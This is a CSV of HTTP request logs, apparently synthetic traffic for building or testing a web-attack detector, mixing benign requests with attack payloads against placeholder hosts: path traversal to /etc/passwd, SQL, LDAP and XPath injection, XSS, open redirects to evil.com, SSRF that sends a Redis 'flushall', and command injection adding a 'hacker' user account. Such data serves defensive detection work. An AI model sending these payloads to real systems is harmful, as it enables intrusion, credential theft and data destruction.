source_ip,timestamp,full_url,method,host,path,query_string,fragment,status_code,user_agent,referrer,source
192.168.1.184,2026-04-07T07:48:26.903416,http://secure.example.com/api/v2/data?to=2024-12-31&id=123&filter=recent,POST,secure.example.com,/api/v2/data,to=2024-12-31&id=123&filter=recent,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.193,2026-04-07T07:48:26.903416,https://admin.example.com/api/users,HEAD,admin.example.com,/api/users,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.83,2026-04-07T07:48:26.903416,https://api.example.com/api/message?message=<video><source,POST,api.example.com,/api/message,message=<video><source,,,dirbuster,,pcap
172.16.0.89,2026-04-07T07:48:26.904927,http://admin.example.com/register?format=json&sort=asc,POST,admin.example.com,/register,format=json&sort=asc,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.183,2026-04-07T07:48:26.904927,http://admin.example.com/blog?to=2024-12-31&status=active&q=laptop,GET,admin.example.com,/blog,to=2024-12-31&status=active&q=laptop,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.196,2026-04-07T07:48:26.905994,http://192.168.1.100/logout?type=product&category=electronics,GET,192.168.1.100,/logout,type=product&category=electronics,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
10.0.0.147,2026-04-07T07:48:26.905994,http://api.example.com/api/v2/data,HEAD,api.example.com,/api/v2/data,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.2,2026-04-07T07:48:26.905994,http://admin.example.com/products?page=1,GET,admin.example.com,/products,page=1,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
192.168.1.203,2026-04-07T07:48:26.907003,https://webapp.internal/link?dest=%2F%5Cevil.com,GET,webapp.internal,/link,dest=%2F%5Cevil.com,,,python-requests/2.31.0,,pcap
10.0.0.232,2026-04-07T07:48:26.907003,http://webapp.internal/contact?view=list&category=electronics&to=2024-12-31,GET,webapp.internal,/contact,view=list&category=electronics&to=2024-12-31,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.91,2026-04-07T07:48:26.907003,http://webapp.internal/privacy?type=product,POST,webapp.internal,/privacy,type=product,,,PostmanRuntime/7.35.0,,pcap
192.168.1.51,2026-04-07T07:48:26.907996,http://192.168.1.100/faq?id=123&q=laptop&type=product,POST,192.168.1.100,/faq,id=123&q=laptop&type=product,,,python-requests/2.31.0,,pcap
10.0.0.77,2026-04-07T07:48:26.907996,http://test-app.local/css/style.css?to=2024-12-31,GET,test-app.local,/css/style.css,to=2024-12-31,,,curl/8.4.0,,pcap
10.0.0.177,2026-04-07T07:48:26.907996,https://api.example.com/privacy,GET,api.example.com,/privacy,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.205,2026-04-07T07:48:26.908965,https://webapp.internal/redir?redirect=%2F%2F%2F%2Fevil.com,GET,webapp.internal,/redir,redirect=%2F%2F%2F%2Fevil.com,,,masscan/1.3,,pcap
172.16.0.33,2026-04-07T07:48:26.908965,http://shop.example.com/css/style.css?limit=10&filter=recent&sort=asc,HEAD,shop.example.com,/css/style.css,limit=10&filter=recent&sort=asc,,,python-requests/2.31.0,,pcap
192.168.1.66,2026-04-07T07:48:26.908965,https://secure.example.com/download/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,GET,secure.example.com,/download/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,,,,masscan/1.3,,pcap
10.0.0.240,2026-04-07T07:48:26.909948,http://webapp.internal/load?file=..%255c..%255c..%255cetc/passwd,GET,webapp.internal,/load,file=..%255c..%255c..%255cetc/passwd,,,sqlmap/1.7.12#dev,,pcap
192.168.1.225,2026-04-07T07:48:26.909948,http://api.example.com/dashboard,POST,api.example.com,/dashboard,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.92,2026-04-07T07:48:26.909948,http://admin.example.com/faq?brand=apple&type=product&view=list,POST,admin.example.com,/faq,brand=apple&type=product&view=list,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.105,2026-04-07T07:48:26.910927,http://admin.example.com/view?file=..%255c..%255c..%255cetc/passwd,GET,admin.example.com,/view,file=..%255c..%255c..%255cetc/passwd,,,gobuster/3.6,,pcap
10.0.0.114,2026-04-07T07:48:26.910927,https://secure.example.com/link?url=%2F%5Cevil.com,GET,secure.example.com,/link,url=%2F%5Cevil.com,,,masscan/1.3,,pcap
172.16.0.147,2026-04-07T07:48:26.910927,https://test-app.local/download/..%2f..%2f..%2fetc%2fpasswd,GET,test-app.local,/download/..%2f..%2f..%2fetc%2fpasswd,,,,dirbuster,,pcap
10.0.0.134,2026-04-07T07:48:26.911907,http://example.com/download/../../../etc/passwd,GET,example.com,/download/../../../etc/passwd,,,,python-requests/2.31.0,,pcap
172.16.0.158,2026-04-07T07:48:26.911907,http://example.com/api/execute?host=test;,GET,example.com,/api/execute,host=test;,,,gobuster/3.6,,pcap
10.0.0.82,2026-04-07T07:48:26.912877,https://secure.example.com/comment?query=<div,POST,secure.example.com,/comment,query=<div,,,sqlmap/1.7.12#dev,,pcap
192.168.1.107,2026-04-07T07:48:26.912877,https://test-app.local/comment?q=<div,POST,test-app.local,/comment,q=<div,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.105,2026-04-07T07:48:26.912877,http://10.0.0.50/search?type=product&view=list&lang=en,GET,10.0.0.50,/search,type=product&view=list&lang=en,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.23,2026-04-07T07:48:26.913861,http://api.example.com/admin/run?ip=test&,POST,api.example.com,/admin/run,ip=test&,,,sqlmap/1.7.12#dev,,pcap
192.168.1.167,2026-04-07T07:48:26.913861,https://secure.example.com/products?username=',POST,secure.example.com,/products,username=',,,masscan/1.3,,pcap
192.168.1.241,2026-04-07T07:48:26.913861,http://api.example.com/blog?to=2024-12-31&q=laptop,GET,api.example.com,/blog,to=2024-12-31&q=laptop,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.215,2026-04-07T07:48:26.915370,http://webapp.internal/api/v1/health?id=123&filter=recent,GET,webapp.internal,/api/v1/health,id=123&filter=recent,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.70,2026-04-07T07:48:26.915370,http://api.example.com/lookup?query=%2A%29%28mail%3D%2A,GET,api.example.com,/lookup,query=%2A%29%28mail%3D%2A,,,ZAP/2.14.0,,pcap
172.16.0.118,2026-04-07T07:48:26.916963,http://shop.example.com/faq,GET,shop.example.com,/faq,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.118,2026-04-07T07:48:26.916963,https://webapp.internal/css/style.css,GET,webapp.internal,/css/style.css,,,,python-requests/2.31.0,,pcap
172.16.0.5,2026-04-07T07:48:26.918002,http://shop.example.com/search,POST,shop.example.com,/search,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.81,2026-04-07T07:48:26.918002,https://admin.example.com/privacy,GET,admin.example.com,/privacy,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
10.0.0.220,2026-04-07T07:48:26.919209,http://192.168.1.100/dashboard?to=2024-12-31&lang=en,GET,192.168.1.100,/dashboard,to=2024-12-31&lang=en,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.19,2026-04-07T07:48:26.919209,https://shop.example.com/notifications,POST,shop.example.com,/notifications,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.198,2026-04-07T07:48:26.919209,http://10.0.0.50/index.html,GET,10.0.0.50,/index.html,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.25,2026-04-07T07:48:26.920198,http://api.example.com/dashboard?limit=10&q=laptop,HEAD,api.example.com,/dashboard,limit=10&q=laptop,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.199,2026-04-07T07:48:26.920198,https://webapp.internal/feedback?input=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,GET,webapp.internal,/feedback,input=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,,python-requests/2.31.0,,pcap
10.0.0.176,2026-04-07T07:48:26.920198,https://test-app.local/api/users?user=',GET,test-app.local,/api/users,user=',,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.160,2026-04-07T07:48:26.922155,http://test-app.local/register,GET,test-app.local,/register,,,,python-requests/2.31.0,,pcap
192.168.1.29,2026-04-07T07:48:26.922155,https://10.0.0.50/terms?type=product&order=name&lang=en,HEAD,10.0.0.50,/terms,type=product&order=name&lang=en,,,curl/8.4.0,,pcap
192.168.1.67,2026-04-07T07:48:26.923126,http://192.168.1.100/admin?username=',GET,192.168.1.100,/admin,username=',,,nikto/2.5.0,,pcap
172.16.0.100,2026-04-07T07:48:26.923126,http://10.0.0.50/api/v1/health,GET,10.0.0.50,/api/v1/health,,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.111,2026-04-07T07:48:26.923126,http://192.168.1.100/download/file:///etc/passwd,GET,192.168.1.100,/download/file:///etc/passwd,,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.201,2026-04-07T07:48:26.924344,http://10.0.0.50/blog/post/1,HEAD,10.0.0.50,/blog/post/1,,,,PostmanRuntime/7.35.0,,pcap
10.0.0.232,2026-04-07T07:48:26.924344,http://192.168.1.100/check?url=http%3A%2F%2F192.168.1.1%2F,GET,192.168.1.100,/check,url=http%3A%2F%2F192.168.1.1%2F,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.22,2026-04-07T07:48:26.924344,http://shop.example.com/terms?order=name&q=laptop&from=2024-01-01,POST,shop.example.com,/terms,order=name&q=laptop&from=2024-01-01,,,curl/8.4.0,,pcap
192.168.1.10,2026-04-07T07:48:26.925855,http://192.168.1.100/return?goto=https%3Aevil.com,GET,192.168.1.100,/return,goto=https%3Aevil.com,,,dirbuster,,pcap
192.168.1.118,2026-04-07T07:48:26.925855,http://admin.example.com/feedback?comment=<img,POST,admin.example.com,/feedback,comment=<img,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.188,2026-04-07T07:48:26.926915,https://example.com/search,GET,example.com,/search,,,,curl/8.4.0,,pcap
192.168.1.171,2026-04-07T07:48:26.926915,https://example.com/login?type=product,GET,example.com,/login,type=product,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.169,2026-04-07T07:48:26.927903,http://192.168.1.100/images/logo.png?filter=recent,GET,192.168.1.100,/images/logo.png,filter=recent,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.60,2026-04-07T07:48:26.927903,https://test-app.local/terms,GET,test-app.local,/terms,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.116,2026-04-07T07:48:26.928875,https://test-app.local/search?cn=%2A%29%28uid%3Dadmin%29%29,GET,test-app.local,/search,cn=%2A%29%28uid%3Dadmin%29%29,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.75,2026-04-07T07:48:26.928875,http://test-app.local/search,GET,test-app.local,/search,,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.230,2026-04-07T07:48:26.929853,http://webapp.internal/api/products?sort=asc&type=product&lang=en,GET,webapp.internal,/api/products,sort=asc&type=product&lang=en,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.20,2026-04-07T07:48:26.929853,https://secure.example.com/ldap?filter=%2A%29%29%2500,GET,secure.example.com,/ldap,filter=%2A%29%29%2500,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.38,2026-04-07T07:48:26.929853,http://test-app.local/faq?format=json,GET,test-app.local,/faq,format=json,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.19,2026-04-07T07:48:26.930831,http://shop.example.com/return?return=%2F%2Fevil.com%2Fpath,GET,shop.example.com,/return,return=%2F%2Fevil.com%2Fpath,,,nuclei,,pcap
10.0.0.80,2026-04-07T07:48:26.930831,https://example.com/settings,GET,example.com,/settings,,,,PostmanRuntime/7.35.0,,pcap
172.16.0.225,2026-04-07T07:48:26.930831,https://192.168.1.100/api/users?q=%27%20UNION%20SELECT%20NULL--,GET,192.168.1.100,/api/users,q=%27%20UNION%20SELECT%20NULL--,,,PostmanRuntime/7.35.0,,pcap
172.16.0.174,2026-04-07T07:48:26.931885,http://api.example.com/directory?filter=%2A%28%29%7C%2526%27,GET,api.example.com,/directory,filter=%2A%28%29%7C%2526%27,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
192.168.1.254,2026-04-07T07:48:26.931885,http://shop.example.com/news,GET,shop.example.com,/news,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.12,2026-04-07T07:48:26.931885,https://webapp.internal/search?category=',POST,webapp.internal,/search,category=',,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.50,2026-04-07T07:48:26.931885,http://webapp.internal/faq?format=json&brand=apple,GET,webapp.internal,/faq,format=json&brand=apple,,,python-requests/2.31.0,,pcap
192.168.1.248,2026-04-07T07:48:26.933213,https://example.com/register?sort=asc,HEAD,example.com,/register,sort=asc,,,curl/8.4.0,,pcap
10.0.0.5,2026-04-07T07:48:26.933213,http://shop.example.com/api/orders?filter=recent&page=1,GET,shop.example.com,/api/orders,filter=recent&page=1,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.43,2026-04-07T07:48:26.933213,http://example.com/blog/post/1?type=product&sort=asc,GET,example.com,/blog/post/1,type=product&sort=asc,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.79,2026-04-07T07:48:26.934296,https://secure.example.com/faq?from=2024-01-01,GET,secure.example.com,/faq,from=2024-01-01,,,PostmanRuntime/7.35.0,,pcap
192.168.1.221,2026-04-07T07:48:26.934296,http://secure.example.com/login,HEAD,secure.example.com,/login,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.232,2026-04-07T07:48:26.934296,https://webapp.internal/blog,HEAD,webapp.internal,/blog,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.3,2026-04-07T07:48:26.935415,http://admin.example.com/search?filter=admin%29%28%26%29,GET,admin.example.com,/search,filter=admin%29%28%26%29,,,Nmap Scripting Engine,,pcap
172.16.0.52,2026-04-07T07:48:26.935925,http://test-app.local/api/execute?host=test%26%20net%20user%20hacker%20hacker123%20%2Fadd,GET,test-app.local,/api/execute,host=test%26%20net%20user%20hacker%20hacker123%20%2Fadd,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.99,2026-04-07T07:48:26.935925,"http://10.0.0.50/api/message?query=""-alert(1)-""",POST,10.0.0.50,/api/message,"query=""-alert(1)-""",,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.9,2026-04-07T07:48:26.936980,https://secure.example.com/faq,POST,secure.example.com,/faq,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.54,2026-04-07T07:48:26.936980,http://shop.example.com/redir?url=https%3A%2F%2Fevil.com%40legitimate.com,GET,shop.example.com,/redir,url=https%3A%2F%2Fevil.com%40legitimate.com,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.168,2026-04-07T07:48:26.936980,http://api.example.com/terms?page=1&from=2024-01-01,GET,api.example.com,/terms,page=1&from=2024-01-01,,,python-requests/2.31.0,,pcap
192.168.1.217,2026-04-07T07:48:26.936980,http://secure.example.com/css/style.css,GET,secure.example.com,/css/style.css,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.134,2026-04-07T07:48:26.938545,http://admin.example.com/js/main.js?from=2024-01-01&user=john,POST,admin.example.com,/js/main.js,from=2024-01-01&user=john,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.123,2026-04-07T07:48:26.938545,https://example.com/search,GET,example.com,/search,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.10,2026-04-07T07:48:26.939522,http://example.com/redirect?next=http%3A%2F%2Fevil.com,GET,example.com,/redirect,next=http%3A%2F%2Fevil.com,,,curl/8.4.0,,pcap
10.0.0.99,2026-04-07T07:48:26.939522,https://test-app.local/api/v1/status,GET,test-app.local,/api/v1/status,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.142,2026-04-07T07:48:26.939522,http://10.0.0.50/events,HEAD,10.0.0.50,/events,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.18,2026-04-07T07:48:26.939522,https://example.com/profile?name=<img,POST,example.com,/profile,name=<img,,,nikto/2.5.0,,pcap
10.0.0.238,2026-04-07T07:48:26.940525,https://example.com/admin?username=',GET,example.com,/admin,username=',,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
192.168.1.35,2026-04-07T07:48:26.940525,http://secure.example.com/news,POST,secure.example.com,/news,,,,curl/8.4.0,,pcap
192.168.1.252,2026-04-07T07:48:26.940525,https://10.0.0.50/terms,GET,10.0.0.50,/terms,,,,python-requests/2.31.0,,pcap
172.16.0.12,2026-04-07T07:48:26.940525,http://10.0.0.50/download/php://filter/convert.base64-encode/resource=index.php,GET,10.0.0.50,/download/php://filter/convert.base64-encode/resource=index.php,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.93,2026-04-07T07:48:26.941988,http://10.0.0.50/lookup?filter=admin%29%28%26%29,GET,10.0.0.50,/lookup,filter=admin%29%28%26%29,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.37,2026-04-07T07:48:26.941988,http://webapp.internal/api/products,HEAD,webapp.internal,/api/products,,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.226,2026-04-07T07:48:26.941988,http://test-app.local/profile?status=active&type=product&q=laptop,POST,test-app.local,/profile,status=active&type=product&q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
192.168.1.105,2026-04-07T07:48:26.943017,http://admin.example.com/about,GET,admin.example.com,/about,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.141,2026-04-07T07:48:26.943017,http://admin.example.com/proxy?fetch=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,GET,admin.example.com,/proxy,fetch=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,,,curl/8.4.0,,pcap
192.168.1.136,2026-04-07T07:48:26.943017,http://shop.example.com/help,POST,shop.example.com,/help,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.239,2026-04-07T07:48:26.943017,http://admin.example.com/products?user=%27%20OR%201%3D1%23,GET,admin.example.com,/products,user=%27%20OR%201%3D1%23,,,nikto/2.5.0,,pcap
172.16.0.33,2026-04-07T07:48:26.944194,http://shop.example.com/terms?sort=asc&page=1,HEAD,shop.example.com,/terms,sort=asc&page=1,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.83,2026-04-07T07:48:26.944194,http://test-app.local/settings,POST,test-app.local,/settings,,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.156,2026-04-07T07:48:26.944194,https://192.168.1.100/directory?uid=admin%29%28%21%28%26%281%3D0,GET,192.168.1.100,/directory,uid=admin%29%28%21%28%26%281%3D0,,,burpsuite,,pcap
192.168.1.100,2026-04-07T07:48:26.944194,https://webapp.internal/news?from=2024-01-01&view=list,POST,webapp.internal,/news,from=2024-01-01&view=list,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.6,2026-04-07T07:48:26.945202,http://api.example.com/blog/category/tech?sort=asc&lang=en&user=john,HEAD,api.example.com,/blog/category/tech,sort=asc&lang=en&user=john,,,curl/8.4.0,,pcap
10.0.0.25,2026-04-07T07:48:26.945202,http://webapp.internal/download/..%255c..%255c..%255cetc/passwd,GET,webapp.internal,/download/..%255c..%255c..%255cetc/passwd,,,,curl/8.4.0,,pcap
192.168.1.230,2026-04-07T07:48:26.946210,http://secure.example.com/blog?format=json&id=123,GET,secure.example.com,/blog,format=json&id=123,,,python-requests/2.31.0,,pcap
172.16.0.202,2026-04-07T07:48:26.946210,https://admin.example.com/ping?command=test;,GET,admin.example.com,/ping,command=test;,,,nuclei,,pcap
10.0.0.210,2026-04-07T07:48:26.947261,http://webapp.internal/products?category=',POST,webapp.internal,/products,category=',,,python-requests/2.31.0,,pcap
172.16.0.87,2026-04-07T07:48:26.947261,http://example.com/image?url=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,GET,example.com,/image,url=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,,,nikto/2.5.0,,pcap
192.168.1.73,2026-04-07T07:48:26.947261,https://secure.example.com/api/message?input=<marquee,POST,secure.example.com,/api/message,input=<marquee,,,wfuzz/3.1.0,,pcap
192.168.1.79,2026-04-07T07:48:26.948413,http://admin.example.com/ldap?user=admin%2A,GET,admin.example.com,/ldap,user=admin%2A,,,nikto/2.5.0,,pcap
10.0.0.160,2026-04-07T07:48:26.948413,http://admin.example.com/ldap?username=x%27%20or%20name%28%29%3D%27username%27%20or%20%27x%27%3D%27y,GET,admin.example.com,/ldap,username=x%27%20or%20name%28%29%3D%27username%27%20or%20%27x%27%3D%27y,,,dirbuster,,pcap
172.16.0.243,2026-04-07T07:48:26.949457,http://192.168.1.100/logout,GET,192.168.1.100,/logout,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.29,2026-04-07T07:48:26.950431,http://secure.example.com/terms,POST,secure.example.com,/terms,,,,curl/8.4.0,,pcap
